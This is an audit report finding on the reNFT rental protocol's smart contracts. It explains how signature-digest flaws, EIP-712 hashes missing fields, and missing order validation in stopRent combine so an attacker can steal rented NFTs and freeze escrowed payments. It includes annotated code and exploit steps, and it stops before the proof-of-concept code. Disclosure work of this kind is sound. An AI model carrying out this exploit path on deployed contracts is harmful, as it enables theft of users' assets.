[H-05] Malicious actor can steal any actively rented NFT and freeze the rental payments (of the affected rentals) in theescrowcontract
Submitted byJCN, also found bytrachev,serial-coder, zzzitron (1,2),hash,rbserver,fnanni,juancito, Qkite (1,2,3),KupiaSec,krikolkk,zach,0xpiken, kaden (1,2),ravikiranweb3,J4X,rvierdiiev,Krace,Audinarey,Aymen0909,0xDING99YA,Ward, DanielArmstrong (1,2),evmboi32,AkshaySrivastav, andABAIKUNANBAEV
https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L265-L302
https://github.com/re-nft/smart-contracts/blob/3ddd32455a849c3c6dc3c3aad7a33a6c9b44c291/src/policies/Stop.sol#L313-L363
The main exploit presented in this report takes advantage of multiple bugs. Some of these bugs on their own can be viewed as having their own “lesser” impacts. However, this report can be considered as my demonstration of thegreatest impactfor all the bugs described below:
ThestopRent/stopRentBatchfunctions do not validate the existence of the suppliedRentalOrderuntil after the lender is sent the specified NFT. Therefore, a non-existentRentalOrdercan be supplied and then created during the callback to the lender (onERC721Received/onERC1155Received). (Successful exploitation of this bug is dependent on the other bugs below)The signature digest signed by the protocol signer is predictable and not necessarily unique to a specific order. Therefore, a generic signature can be retrieved from theoretically any order (via the front-end) and can then be used arbitrarily (for multiple fulfillments) untilmetadata.expiration > block.timestamp. This enables the above bug to be utilized, as a required signature is able to be retrieved beforehand so that the order creation and fulfillment process can be executed atomically for multiple orders. (Successful exploitation of this bug is not dependent on the other bugs mentioned)Several core functions inSigner.solare not compliant with EIP-712. This can be leveraged with the above bugs to obtain a valid signature and use this signature with multiple orders that have differentmetadata.orderTypevalues. This also allows arbitrarysafe walletaddresses to be included in theRentalOrderstruct supplied to thestopfunctions. (Successful exploitation of this bug is not dependent on the other bugs mentioned)
Combined, the above vulnerabilities allow the theft and freezing of any and/or all NFTs currently being rented out (active or expired, as long as the rental has not been stopped). The rental payments for the affected rentals will also be frozen in theescrowcontract. The outline of thisBug Descriptionsection will be as follows:
The main exploit path will be discussedPrerequisites for the main exploit will be discussedLesser, independently achievable, impacts of the independent vulnerabilities (2 & 3) will be briefly explained
Main exploit path
In order to thoroughly detail this exploit path I will provide my explanation as a means to prove that the following actions are possible:
A non existentRentalOrdercan be passed into astopfunction and pass validation. The only requirement for this exploit is that theRentalOrder.orderTypespecifies aPAYorder andmsg.sender == RentalOrder.lender.The only fields in thisRentalOrderthat pertain to the rental order (rented NFT) being exploited are theRentalOrder.itemsandRentalOrder.rentalWalletfields. Theitemsfield will specify the rented NFT that therentalWallet(victim) curently owns. All other fields can differ.This non existentRentalOrdercan be created and fulfilled during thereclamationprocess in which the rented NFT gets transferred from therentalWallet(victim) to theRentalOrder.lender(specified by exploiter). This can be done during theonERC721Received/onERC1155Receivedcallback to theRentalOrder.lender. Note that during the creation and fulfillment process we will specify ourattacker safeas theRentPayload.fulfillmentso that ourattacker safewill receive the stolen NFT specified in theitemsfield.Once theRentalOrderhas been created in storage, the next state-modifyingsettlePaymentandremoveRentalsfunction calls will succeed. The first call will result in theRentalOrder.lenderreceiving back the ERC20 token payment specified in thisRentalOrder, and the second call will remove this newly createdRentalOrderfrom storage.During theremoveRentalscall the computedorderHash(this is used to identify a specific rental order) does not take into account theRentalOrder.rentalWallet. Therefore, this allowed us to supply the victim’ssafe walletinstead of ourattacker safein thestopfunction calls and ultimately produce the necessaryorderHashthat corresponds to our newly createdRentalOrder.
When a rental is stopped thestopRentfunction is invoked (thestopRentBatchfunction can also be used and has similar functionality). ARentalOrderstruct is supplied to this function and the only validation for this struct is performed in the_validateRentalCanBeStopedinternal function on line 267 ofStop::stopRent:
Stop::stopRent#L265-L267
265:functionstopRent(RentalOrdercalldataorder)external{266:// Check that the rental can be stopped.267:_validateRentalCanBeStoped(order.orderType,order.endTimestamp,order.lender);
Stop::_validateRentalCanBeStoped#L126-L154
126:function_validateRentalCanBeStoped(127:OrderTypeorderType,128:uint256endTimestamp,129:addressexpectedLender130:    )internalview{131:// Determine if the order has expired.132:boolhasExpired=endTimestamp<=block.timestamp;133:134:// Determine if the fulfiller is the lender of the order.135:boolisLender=expectedLender==msg.sender;136:137:// BASE orders processing.138:if(orderType.isBaseOrder()) {139:// check that the period for the rental order has expired.140:if(!hasExpired) {141:revertErrors.StopPolicy_CannotStopOrder(block.timestamp,msg.sender);142:            }143:        }144:// PAY order processing.145:elseif(orderType.isPayOrder()) {146:// If the stopper is the lender, then it doesnt matter whether the rental147:// has expired. But if the stopper is not the lender, then the rental must have expired.148:if(!isLender&& (!hasExpired)) {149:revertErrors.StopPolicy_CannotStopOrder(block.timestamp,msg.sender);150:            }151:        }152:// Revert if given an invalid order type.153:else{154:revertErrors.Shared_OrderTypeNotSupported(uint8(orderType));
As we can see above, only theorderType,endTimestamp, andlenderfields of theRentalOrderstruct are used in order to validate whether or not a rental order can be stoppped. If a non-existentRentalOrderis supplied to thestopRentfunction, this check will pass if theorderTypeis aPAYorder and themsg.senderfor this call is thelender.
Next, arentalAssetUpdatesbytes array is constructed with respect to the NFTs specified in theRentalOrder.itemsfield and thesafe walletspecified in theRentalOrder.rentalWalletfield. ThisrentalAssetsUpdatearray contains information that ties together therentalWalletanditemsfields supplied and is used to update storage when theRentalOrderis finally stopped (removed from storage).
Stop::stopRent#L272-L282
272:bytesmemoryrentalAssetUpdates=newbytes(0);273:274:// Check if each item in the order is a rental. If so, then generate the rental asset update.275:// Memory will become safe again after this block.276:for(uint256i;i<order.items.length; ++i) {277:if(order.items[i].isRental()) {// @audit: `items[i]` has information regarding the NFT we wish to steal278:// Insert the rental asset update into the dynamic array.279:_insert(280:rentalAssetUpdates,281:order.items[i].toRentalId(order.rentalWallet),// @audit: `rentalWallet` is the victim (holds NFT)282:order.items[i].amount
Note that the information in therentalAssetsUpdatespertains to the rental order (rented NFT) that we are exploiting. No validation or state changes occur during this construction and therefore the execution continues to line 288:
Stop::stopRent#L288-L290
288:if(order.hooks.length>0) {289:_removeHooks(order.hooks,order.items,order.rentalWallet);290:        }
The above lines of code are simple to bypass. If our suppliedRentalOrderdoes not specifyhooks, then the code on lines 288 - 290 will be skipped.
Next, the reclamation process is initiated:
Stop::stopRent#L292-L293
292:// Interaction: Transfer rentals from the renter back to lender.293:_reclaimRentedItems(order);
Stop::_reclaimRentedItem#L166-L177
166:function_reclaimRentedItems(RentalOrdermemoryorder)internal{167:// Transfer ERC721s from the renter back to lender.168:boolsuccess=ISafe(order.rentalWallet).execTransactionFromModule(// audit: perform call to victim169:// Stop policy inherits the reclaimer package.170:address(this),171:// value.172:0,173:// The encoded call to the `reclaimRentalOrder` function.174:abi.encodeWithSelector(this.reclaimRentalOrder.selector,order),175:// Safe must delegate call to the stop policy so that it is the msg.sender.176:Enum.Operation.DelegateCall177:        );
The above code will initiate adelegate callvia theRentalOrder.rentalWallet(victim). This call will invoke the following code:
Reclaimer::reclaimRentalOrder#L89-L99
89:// Transfer each item if it is a rented asset.90:for(uint256i=0;i<itemCount; ++i) {91:Itemmemoryitem=rentalOrder.items[i];92:93:// Check if the item is an ERC721.94:if(item.itemType==ItemType.ERC721)// @audit: `item` points to targetted NFT95:_transferERC721(item,rentalOrder.lender);// @audit: `lender` is defined by exploiter96:97:// check if the item is an ERC1155.98:if(item.itemType==ItemType.ERC1155)99:_transferERC1155(item,rentalOrder.lender);
Reclaimer.sol#L32-L49
32:function_transferERC721(Itemmemoryitem,addressrecipient)private{33:IERC721(item.token).safeTransferFrom(address(this),recipient,item.identifier);// @audit: transferring NFT from victim safe to `lender`34:    }35:36:/**37:     *@devHelper function to transfer an ERC1155 token.38:     *39:     *@paramitemItem which will be transferred.40:     *@paramrecipientAddress which will receive the token.41:     */42:function_transferERC1155(Itemmemoryitem,addressrecipient)private{43:IERC1155(item.token).safeTransferFrom(44:address(this),// @audit: delegate call, so address(this) == victim safe45:recipient,// @audit: recipient is `lender`46:item.identifier,// @audit: tokenId of target NFT47:item.amount,// @audit: amount of target NFT48:""49:        );
As we can see above, thereclaimRentalOrderfunction will be invoked by theRentalOrder.rentalWalletvia a delegate call and this will result in the target NFT being transferred out of thevictim safeand to our specifiedlenderaddress.
For this exploit, thelenderaddress supplied will be a contract (attackerContract) and therefore aonERC721Received/onERC1155Receivedcallback will be performed via this contract. During this callback, the order that will correspond to the suppliedRentalOrder(currently non-existent) will be created and fulfilled. Here is a brief description of the steps that occur during this callback:
TheattackerContractcreates an on-chainPAYorder (acting as lender). This order specifies the stolen NFT as the NFT to rent out.TheattackerContractcreates a complimentary on-chainPAYEEorder (acting as renter). This order mirrors thePAYorder previously created.TheattackerContractfulfills the orders viaSeaport::matchAdvancedOrders(acting as renter). Note that this will require a server-side signature to be retrieved beforehand. I will explain this further, along with other prerequisites for this exploit, in a later section.The end result is that the stolen NFT has been sent to our specifiedattacker safeand ourattackerContracthas sentxamount of ERC20 tokens to theescrowcontract for this rental order. (xcan be as little as1 wei). Our newly createdRentalOrderis then hashed and recorded in storage.
During our callback theCreate::validateOrderfunction will be called bySeaportfor our specifiedPAYorder (this will also occur for our complimentaryPAYEEorder, but thePAYEEcall does not result in any state changes). During this call theRentalOrderfor our newly created order will be constructed and then the hash of thatRentalOrderwill be stored in storage, indicating an active rental:
Create::_rentFromZone#L579-L595
579:RentalOrdermemoryorder=RentalOrder({580:seaportOrderHash:seaportPayload.orderHash,581:items:items,582:hooks:payload.metadata.hooks,583:orderType:payload.metadata.orderType,584:lender:seaportPayload.offerer,585:renter:payload.intendedFulfiller,586:rentalWallet:payload.fulfillment.recipient,587:startTimestamp:block.timestamp,588:endTimestamp:block.timestamp+payload.metadata.rentDuration589:            });590:591:// Compute the order hash.592:bytes32orderHash=_deriveRentalOrderHash(order);593:594:// Interaction: Update storage only if the order is a Base Order or Pay order.595:STORE.addRentals(orderHash,_convertToStatic(rentalAssetUpdates));
The above code shows how theRentalOrderis constructed. Notice that theRentalOrderstruct contains arentalWalletfield. This struct is then passed into the_deriveRentalOrderHashfunction in order to derive theorderHash. TheorderHashis then stored in storage via theStorage::addRentalscall on line 595. Lets observe how thisorderHashis computed:
Signer::_deriveRentalOrderHash#L181-L193
181:return182:keccak256(183:abi.encode(184:_RENTAL_ORDER_TYPEHASH,185:order.seaportOrderHash,186:keccak256(abi.encodePacked(itemHashes)),187:keccak256(abi.encodePacked(hookHashes)),188:order.orderType,189:order.lender,190:order.renter,// @audit: rentalWallet field should be below this line191:order.startTimestamp,192:order.endTimestamp193:                )
According to the above code, theRentalOrder.rentalWalletfield is not considered when creating the EIP-712 hash for theRentalOrderstruct. Therefore, theRentalOrder.rentalWalletcan be any address and the_deriveRentalOrderHashwill produce a “correct”orderHashas long as all other fields pertain to an actual active order.
After the actions in the callback are performed, execution in thestopRentfunction continues to line 296:
Stop::stopRent#L295-L296
295:// Interaction: Transfer ERC20 payments from the escrow contract to the respective recipients.296:ESCRW.settlePayment(order);
PaymentEscrow::settlePayment#L320-L329
320:functionsettlePayment(RentalOrdercalldataorder)externalonlyByProxypermissioned{321:// Settle all payments for the order.322:_settlePayment(// @audit: all order fields pertain to our newly created rental order, no issues here323:order.items,324:order.orderType,325:order.lender,326:order.renter,327:order.startTimestamp,328:order.endTimestamp329:        );
As we can see above, all the fields of theRentalOrdersupplied, that are used in the_settlePaymentfunction, pertain to our newly createdRentalOrder. Remember, the only field that does not pertain to this new order is theRentalOrder.rentalWalletfield, which points to thevictim safethat was the previous owner of the stolen NFT. Therefore, execution in this function call will continue as expected for anyPAYorder: thelenderandrenterwilll receive theirpro-ratashare of the rental payment that was sent to thisescrowcontract during fulfillment. Reminder: theattackerContractis both thelenderandrenterfor this new order.
Finally, theRentalOrdersupplied will be removed from storage:
Stop::stopRent#L299-L302
299:STORE.removeRentals(300:_deriveRentalOrderHash(order),// @audit: returns "correct" orderHash for our newly created RentalOrder301:_convertToStatic(rentalAssetUpdates)// @audit: pertains to the victim's safe wallet + NFT302:        );
First, theorderHashfor the suppliedRentalOrderis retrieved via the_deriveRentalOrderHashinternal function. As mentioned previously, theRentalOrder.rentalWalletis ignored when computing theorderHashand therefore the computedorderHashwill correctly pertain to our newly created order (this is despite the fact that the suppliedRentalOrder.rentalWalletpoints to thevictim safeand not ourattacker safe).
The_convertToStaticinternal function on line 301 ofStop::stopRentwill simply create aRentalAssetUpdate[]array which contains arentalIdthat pertains the thevictim safeand details of the target NFT.
TheStorage::removeRentalsfunction will then be called:
Storage::removeRentals#L216-L233
216:functionremoveRentals(217:bytes32orderHash,// @audit: orderHash for our newly created order218:RentalAssetUpdate[]calldatarentalAssetUpdates219:    )externalonlyByProxypermissioned{220:// The order must exist to be deleted.221:if(!orders[orderHash]) {// @audit: orderHash was stored during callback222:revertErrors.StorageModule_OrderDoesNotExist(orderHash);223:        }else{224:// Delete the order from storage.225:deleteorders[orderHash];// @audit: our order is removed from storage (stopped)226:        }227:228:// Process each rental asset.229:for(uint256i=0;i<rentalAssetUpdates.length; ++i) {230:RentalAssetUpdatememoryasset=rentalAssetUpdates[i];231:232:// Reduce the amount of tokens for the particular rental ID.233:rentedAssets[asset.rentalId] -=asset.amount;// @audit: storage update for victim's `rentalId`
As we can see above, ourorderHashis removed from storage on line 225. And the state update on line 233 only pertains to the victim’s rental order. Note: When the victim’s rental order was created therentedAssets[asset.rentalId]was incremented byasset.amountand here the mapping is simply being decremented byasset.amount. Theattacker safeis now the owner of the target NFT. Since theorderHashcorresponding to theRentalOrder, that theattackerContractcreated, was removed from storage during this call tostopRent, the stolen NFT will remain frozen in theattacker safe(only rentals with anorderHashstored in storage can be stopped). In addition, the rental payment for the exploitedRentalOrderwill remain frozen in theescrowcontract since that rental order can alsonotbe stopped. This is due to the fact that the affected order’ssafe walletno longer owns the NFT. Thus, the reclamation process will fail when the NFT is attempted to be transferred out of thesafe wallet(theattacker safeis now the owner of these NFT). A malicious actor is able to perform this exploit to steal and affect multiple NFTs (and their respective rental orders) by utilizing thestopRentBatchfunction.
Prerequisites for the main exploit
Now I will discuss the prerequisites for this exploit. The first being that ourattackerContractwill require a valid server-side signature in order to fulfill thePAYandPAYEEorders created during the callback.Note:PAYorders require the fulfiller to also create a complimentaryPAYEEorder. The fulfiller is then expected to receive signatures forbothof these orders and supply them together to theSeaport::matchAdvancedOrdersfunction in order to fulfill both thePAYandPAYEEorders. Let us observe the digest that theserver-side signersigns in order to create a valid signature:
Create::validateOrder#L759-L763
759:// Recover the signer from the payload.760:addresssigner=_recoverSignerFromPayload(761:_deriveRentPayloadHash(payload),762:signature763:        );
Line 761 will return the digest and then the_recoverSignerFromPayloadinternal function will recover the signing address via the digest and the suppliedsignature. Zooming in on the_deriveRentPayloadHashfunction we will observe that this should return the EIP-712 hash of theRentPayloadstruct.
Signer::_deriveRentPayloadHash#L248-L260
248:function_deriveRentPayloadHash(249:RentPayloadmemorypayload250:    )internalviewreturns(bytes32) {251:// Derive and return the rent payload hash as specified by EIP-712.252:return253:keccak256(254:abi.encode(255:_RENT_PAYLOAD_TYPEHASH,256:_deriveOrderFulfillmentHash(payload.fulfillment),257:_deriveOrderMetadataHash(payload.metadata),258:payload.expiration,259:payload.intendedFulfiller260:                )
Below is theRentPayloadstruct:
RentalStructs.sol#L154-L159
154:structRentPayload{155:OrderFulfillmentfulfillment;// @audit: safe wallet specified by fulfiller during signing156:OrderMetadatametadata;// @audit: generic information pertaining to a rental157:uint256expiration;// @audit: defined during signing158:addressintendedFulfiller;// @audit: renter/fulfiller specified by fulfiller during signing159:    }
However, we will notice that the derived hash of theOrderMetadatastruct computed in the_deriveOrderMetadataHashinternal function is not EIP-712 compliant:
Signer::_deriveOrderMetadataHash#L218-L237
218:function_deriveOrderMetadataHash(219:OrderMetadatamemorymetadata220:    )internalviewreturns(bytes32) {221:// Create array for hooks.222:bytes32[]memoryhookHashes=newbytes32[](metadata.hooks.length);223:224:// Iterate over each hook.225:for(uint256i=0;i<metadata.hooks.length; ++i) {226:// Hash the hook227:hookHashes[i] =_deriveHookHash(metadata.hooks[i]);228:        }229:230:// Derive and return the metadata hash as specified by EIP-712.231:return232:keccak256(233:abi.encode(234:_ORDER_METADATA_TYPEHASH,235:metadata.rentDuration,236:keccak256(abi.encodePacked(hookHashes))237:                )
Below is theOrderMetadatastruct:
RentalStructs.sol#L50-L59
50:structOrderMetadata{51:// Type of order being created.52:OrderTypeorderType;// @audit: not included in derived nEIP-721 hash53:// Duration of the rental in seconds.54:uint256rentDuration;55:// Hooks that will act as middleware for the items in the order.56:Hook[]hooks;57:// Any extra data to be emitted upon order fulfillment.58:bytesemittedExtraData;// @audit: not included in derived EIP-721 hash59:    }
As we can see above, theorderTypeandemittedExtraDatafields are not considered when deriving the EIP-712 hash for theOrderMetadatastruct. Since thisOrderMetadatastruct is present in theRentPayloadstruct, which is used as the signature digest, then theorderTypecan be changed and the derivation of theRentPayloadEIP-712 hash will be “correct” (as long as therentDurationandhooksfields are the correct). In addition, we will also notice that theOrderMetadatastruct contains the only information in this digest that pertains to the order that the fulfiller is signing. Specifically, only therentDurationand thehookswill be considered. The other fields in theRentPayloadstruct are supplied and therefore defined via the front-end when the signature is being created.
It is important to note that when aPAYorder is stopped (via one of thestopfunctions), theendTimestamp(which is dependent on therentDuration) is not considered when thelenderis the one stopping the order (whenlender == msg.sender). Since our main exploit requires that ourattackerContractatomically creates and fulfills aPAY/PAYEEorder, therentDurationultimately does not matter since ourattackerContractis thelenderand will be calling thestopRentfunction directly (attackerContract == lender == msg.sender). Therefore, the only loose requirement for our main exploit is that thehooksfield is empty (this is mostly for convenience and to keep the execution flow minimal). Thus, we are able to create a valid signature via the front-end by utilizing virtually any order (theorderTypedoes not matter either since this field is not considered in the derivation of the EIP-712 hash of theOrderMetadatastruct). However, you may have noticed that when creating the signature we must specify arenteras theRentPayload.intendedFulfillerand asafe walletas theRentPayload.fulfillment. This leads us to our second prerequisite:
When an order is fulfilled theRentPayload.intendedFulfillerand theRentPayload.fulfillmentfields are validated:
Create::_rentFromZone#L537-L538
537:// Check: verify the fulfiller of the order is an owner of the recipient safe.538:_isValidSafeOwner(seaportPayload.fulfiller,payload.fulfillment.recipient);// @audit: fulfiller == renter, recipient == safe wallet
Create::_isValidSafeOwner#L647-L655
647:function_isValidSafeOwner(addressowner,addresssafe)internalview{648:// Make sure only protocol-deployed safes can rent.649:if(STORE.deployedSafes(safe) ==0) {650:revertErrors.CreatePolicy_InvalidRentalSafe(safe);651:        }652:653:// Make sure the fulfiller is the owner of the recipient rental safe.654:if(!ISafe(safe).isOwner(owner)) {655:revertErrors.CreatePolicy_InvalidSafeOwner(owner,safe);
As we can see above, theRentPayload.fulfillment.recipientmust be a validsafe walletdeployed via the protocol and theRentPayload.fulfiller(seaportPayload.fulfiller == RentPayload.fulfiller) must be an owner of thatsafe wallet. Therefore, before we obtain a signature for our exploit we must first create ourattackerContract, deploy a safe for our exploit (attacker safe), and ensure that ourattackerContractis an owner of that safe. Fortunately, the process of deploying asafe walletis permissionless and we are able to specify theownersthat we would like to have initialized for our deployed safe:
Factory::deployRentalSafe#L138-L145
138:functiondeployRentalSafe(139:address[]calldataowners,140:uint256threshold141:    )externalreturns(addresssafe) {
Therefore, we can call the above function and supply ourattackerContractas anownerduring this function call. This will result in ourattacker safebeing created and ourattackerContractbeing an owner of this safe. Then we can create a valid fulfillment signature via the front-end (using any order) and specify ourattackerContractas theRentPayload.fulfillerand ourattacker safeas theRentPayload.fulfillment. Now we have a valid signature that we are able to use for our exploit. Note that our exploit requires us to create aPAYorder andPAYorders require a complimentaryPAYEEorder to be created and fulfilled as well. Therefore, we will need to provide a valid signature for ourPAYorder fulfillment and ourPAYEEorder fulfillment. As mentioned previously, since the derived EIP-712 hash of theOrderMetadatastruct, that is signed by theserver-side signer, does not take into account theorderTypefield, we are able to obtain one valid signature for ourattackerContractand modify theorderTypeas we please to utilize it for ourPAYandPAYEEorders. Performing these actions before we initiate our main exploit will result in the actions detailed above in theMain exploit pathsection to execute successfully.
Further description and lesser impacts of bug#2
The predictable signature digest allows some server-side restrictions to be bypassed.
Current server-side restrictions that the sponsor has identified:
startAmountandendAmountmust be the sameunique salt nonce for all seaport ordersa sensible max rent durationchecks to make sure this order hasnt been canceledand some standard validation checks to make sure the seaport order wont instantly revert
As explained in the previous section, the EIP-712 hash of theRentPayloadis the signature digest that theserver-side signerwill sign and this digest + signature are then used to validate order fulfillments during theCreate::validateOrdercall. We have shown that theRentPayload.metadatais the only field that pertains to the specific order that is being fulfilled (all other fields in theRentPayloadare supplied during the signing process via the front-end and pertain to the fulfiller). However, thismetadatafield contains generic details of a rental order that can possibly be similar/identical to other rental orders:
RentalStructs.sol#L50-L59
50:structOrderMetadata{51:// Type of order being created.52:OrderTypeorderType;53:// Duration of the rental in seconds.54:uint256rentDuration;55:// Hooks that will act as middleware for the items in the order.56:Hook[]hooks;57:// Any extra data to be emitted upon order fulfillment.58:bytesemittedExtraData;59:    }
Therefore, if a user wishes to bypass a server-side restriction (using the ones above as an example) that doesnotvalidate fields in theOrderMetadatastruct, then the user can simply create a temporary order via the front-end with valid parameters, obtain a signature for that order via the front-end, cancel their initial order viaSeaport::incrementCounter, create another on-chain order viaSeaport::validate(using restricted parameters), and use the previously obtained signature during the fulfillment of this restricted order. This vulnerability is of lesser impact due to the fact that the impact is vague asserver-side restrictionsare arbitrary and can be changed, removed, added, etc…
Further description and lesser impacts of bug#3
The following functions have been identified to be non-compliant with EIP-712: the_deriveRentalOrderHash,_deriveRentPayloadHash, and the_deriveOrderMetadataHashfunctions. However, only the_deriveRentPayloadHashand_deriveOrderMetadataHashfunctions can result in 3rd party integrators being unable to properly integrate with reNFT (Medium impact). To further explain, the_deriveRentPayloadHashis used to derive the signature digest that theserver-side signersigned to validate order fulfillment. At the present moment, it seems reNFT uses this function in order to derive the signature digest (Seen in their tests. Also none of their tests would pass if they derived the “correct” EIP-712 hashes). Therefore, if 3rd party integrators supply a “correct” EIP-712 digest (RentPayloadhash) to theserver-side signer(perhaps via an SDK), then the resulting signature will not be considered valid during the fulfillment of an order:
Create::validateOrder#L760-L763
760:addresssigner=_recoverSignerFromPayload(761:_deriveRentPayloadHash(payload),// @audit: derives the wrong EIP-712 hash762:signature// @audit: signature created by signing the "correct" EIP-712 hash763:        );
Additionally, the_deriveOrderMetadataHashfunction is used to compare the EIP-712OrderMetadatahash to theOrderComponents.zoneHash. Note that the documentation defines thezoneHashas the EIP-712 hashed version of theOrderMetadatastruct. Observe the following quote from thecreating-a-rental.mddocumentation:
The zoneHash is a hashed value of data which describes the unique values of this particular rental. After this order has been signed, a counterparty (the fulfiller) will pass the unhashed data which makes up the zone hash into the Seaport fulfillment function to prove to the protocol that both the lender and the renter of the order have agreed on the rental terms.
According to the above information, the creator of the order must also use the_deriveOrderMetadataHashto derive the “wrong” EIP-712 hash and supply this as thezoneHashwhen creating (signing) the seaport order. If the creator instead uses the “correct” EIP-712 hash, then the following comparison performed during order fulfillment will result in a revert:
Create::_rentFromZone#L534-L535
534:// Check: make sure order metadata is valid with the given seaport order zone hash.535:_isValidOrderMetadata(payload.metadata,seaportPayload.zoneHash);
Create::_isValidOrderMetadata#L635-L637
635:// Check that the zone hash is equal to the derived hash of the metadata.636:if(_deriveOrderMetadataHash(metadata) !=zoneHash) {// @audit: zoneHash supplied by order creator and metadata is supplied by the fulfiller637:revertErrors.CreatePolicy_InvalidOrderMetadataHash();
Finally, the non-compliance of the_deriveRentalOrderHashcan also result in a differenthighimpact than the main impact described in this report. This impact can be achieved solely by exploiting this bug (not dependent on other bugs) and will allow a malicious actor to steal ERC1155 tokens (not possible for ERC721 tokens) that are actively rented, as well as freeze the rental payment of the affectedRentalOrder. Since this impact only affects ERC1155 tokens and requires the exploiter to first obtain ERC1155 tokens (of equivalent and equal value) as the rental order that is being exploited, this impact is considered “lesser” than the the main impact showcased in this report (although this impact still results in the direct theft and freezing of assets and therefore I believe it would be classified as ahighas well). Below is a brief description of the vulnerability:
A malicious actor will need to create aRentalOrderthat has an identicalRentalOrder.itemsfield compared to thetarget RentalOrderthat they will be exploiting. Therefore, if the targetRentalOrderspecifies the rental of5ERC1155 tokens ofid == 0, then the malicious actor will have to also obtain5ERC1155 tokens ofid == 0and create a rental order for those tokens. The malicious actor will then call thestopRentfunction and supply theirRentalOrder. However, they will leverage the bug inside of the_deriveRentalOrderHashinternal function and modify theirRentalOrder.rentalWalletfield to point to thetarget RentalOrder.rentalWallet(the victim’ssafe wallet). For simplicity we will assume that the malicious actor’sRentalOrderhas expired and is therefore allowed to be stopped.
When the execution in thestopRentfunction reaches the reclamation process, the5ERC1155 tokens ofid == 0will be sent fromRentalOrder.rentalWallet(victim’ssafe wallet) to the malicious actor (RentalOrder.lender). Similar to the previous explanations, thesettlementprocess will proceed as expected for any expired order. The nextStorage::removeRentalscall will also succeed as usual since theorderHashthat is removed from storage is derived using the_deriveRentalOrderHashfunction and since this function does not consider therentalWallet, the producedorderHashwill correctly be associated with the malicious actor’sRentalOrder(despite therentalWalletpointing to the victim’ssafe wallet). However, the maliciousRentalOrdermusthave the sameitemsfield as the victim’s rental order due to the fact that theitemsfieldisconsidered when deriving theorderHash:
Signer::_deriveRentalOrderHash#L181-L186
181:return182:keccak256(183:abi.encode(184:_RENTAL_ORDER_TYPEHASH,185:order.seaportOrderHash,186:keccak256(abi.encodePacked(itemHashes)),// items correctly included in the derived EIP-712 hash
Therefore, this exploit can only occur for ERC1155 tokens since the malicious actor would need to first create aRentalOrderfor the same ERC1155 tokens (amount and tokenId) as the victim’sRentalOrder. This is not possible for ERC721 tokens since they are non-fungible. The result of this lesser impact is that the malicious actor stole the ERC1155 tokens from the victim, froze the victim’s rental payment, and the malicious actor’s originally rented ERC1155 tokens will remain frozen in theirsafe wallet(this is due to the fact that the malicious actor’sorderhashhas been removed from storage and therefore can no longer be stopped/reclaimed).
Note: Since the “lesser” impact above (see gist) can still be considered ofhighseverity/impact I will include an additional PoC for this exploit at the end of theProof of Conceptsection, in the form of a gist.
Main Impact
A malicious actor is able to steal any actively rented NFT using the exploit path detailed in the first section. The capital requirements for the exploiter are as follows: 1) Have at least1 weiof an ERC20 that will be used to create a maliciousRentalOrder(the exploiter will receive these funds back at the end of the exploit). 2) create and deploy aattackerContractand asafe wallet(gas costs). 3) Additional gas costs will be incurred if exploiting severalvictim RentalOrdersat once viastopRentBatch.
This will result in the specified NFT to be stolen from the victim’ssafe walletand transferred to the attacker’ssafe wallet. Since the attacker’s rental order was atomically created and stopped during this function call, no one will be able to callstopRentfor thismalicious RentalOrder, rendering the stolen NFT frozen in the attacker’ssafe wallet. Additionally, thevictim RentalOrderswill not be able to be stopped upon expiration since the reclamation process that occurs during thestopRentfunction call will fail (victim safe walletno longer is the owner of the stolen NFT). This will result in the rental payment for thisvictim RentalOrderto be frozen in theescrowcontract. An exploiter is able to prepare this exploit for multiplevictim RentalOrdersand steal multiple NFTs in one transaction viastopRentBatch.
Proof of Concept
In order to provide more context for the PoC provided below, I will detail the steps that are occuring in the PoC:
Two orders are created (these will act as our victim orders). One will be for an ERC721 token and the other will be for an ERC1155 token.OurattackerContractis created.xamount of wei (for an arbitrary ERC20) is sent to ourattackerContract.x == num_of_victim_orders. These funds will be used when theattackerContractprogramatically creates the malicious rental orders (ourattackerContractwill behave aslenderandrenter).Asafe walletis created (attacker safe) and ourattackerContractis initialized as an owner for that safe.A generic signature is obtained via aOrderMetadatastruct from one of the target orders that were initially created (in practice the order used can be any order).Orderstructs were created and partially filled with values that pertain to thePAYandPAYEEorders that ourattackerContractwill create on-chain viaSeaport::validate. The only fields that are not set during this process are theOfferItemorConsiderationItemfields that specify the ERC721 or ERC1155 token that we will be stealing (these are dyanmic and therefore are determined during the callback functions). TheOrderstructs are then stored in theattackerContractfor later use.This same process is done for theAdvancedOrderstructs that are required for the fulfillment transaction (i.e.Seaport::matchAdvancedOrders). TheAdvancedOrderstructs are then stored in theattackerContractfor later use.TheFulfillmentstruct (required during theSeaport::matchAdvancedOrdersfunction call) is pre-constructed. This struct willl remain the same for all of our order creations. This struct is also stored in theattackerContractfor later use.TheRentalOrder.seaportOrderHash(this is the same as theorderHashthat is computed for ourOrderduring the call toSeaport::validate) is pre-computed viaSeaport::getOrderHash. Note that thisorderHashneeds to be computed with a completeOrderstruct. Since ourOrderstructs were only partially filled during step 6, we will use theRentalOrder.itemsfield of the targetRentalOrderto retrieve the details of the ERC721/ERC1155 token(s) that we will be stealing. We will then use these details to temporarily construct our actualOrderstruct and therefore pre-compute the requiredorderHash.Using theitemsfield of thevictim RentalOrder, we will create our maliciousRentalOrder.TheattackerContractwill initiate a call tostopRentand pass in our maliciousRentalOrder. However, we will first setRentalOrder.rentalWalletequal to therentalWalletof our victimRentalOrder(thesafe walletthat we will be stealing the NFT from).Steps 9 - 11 will be performed for multiple victimRentalOrdersby looping over the orders and computing the necessary maliciousRentalOrders. This time, instead of theattackerContractinitiating a call tostopRent, a call tostopRentBatchwill be initiated and an array of the maliciousRentalOrderswill be supplied.The resulting state will be validated:attacker safeis now the owner of all the stolen NFTs and the victimRentalOrderscan no longer be stopped (even after their expiration).
Place the following test inside of the/test/integration/directory and run test withforge test --mc StealAllRentedNFTs_POC
The below PoC showcases how an attacker can leverage all the bugs described in this report to steal multiple actively rented NFTs viastopRentBatch.
